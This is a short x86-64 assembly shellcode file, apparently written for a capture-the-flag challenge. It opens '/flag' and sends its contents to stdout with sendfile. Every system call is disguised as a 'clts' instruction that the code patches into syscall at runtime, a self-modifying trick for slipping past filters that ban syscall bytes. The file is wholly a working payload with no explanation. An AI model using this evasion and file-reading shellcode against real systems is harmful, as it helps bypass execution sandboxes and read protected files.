.global _start
_start:
.intel_syntax noprefix
        mov rax, 0x67616c662f
        mov [rdi], rax
        mov rsi, 0
        mov rdx, 0
        mov rax, 2
        dec byte ptr [rip + 1]
        clts

        mov rdi, 1
        mov rsi, rax
        mov rax, 40
        mov rdx, 0
        mov r10, 0x100
        dec byte ptr [rip + 1]
        clts

        mov rax, 60
        mov rdi, 0
        dec byte ptr [rip + 1]
        clts